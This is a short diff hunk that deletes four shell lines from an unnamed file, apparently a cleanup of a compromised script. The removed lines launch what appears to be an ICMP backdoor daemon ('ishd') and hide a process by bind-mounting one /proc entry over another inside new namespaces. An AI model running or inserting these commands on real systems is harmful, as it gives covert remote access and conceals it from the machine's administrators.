@@ -1,4 +1,0 @@
-./ishd -i 65535 -t 0 -p 1024
-unshare --mount --pid bash
-mount --make-private /
-mount -B /proc/48 /proc/3179
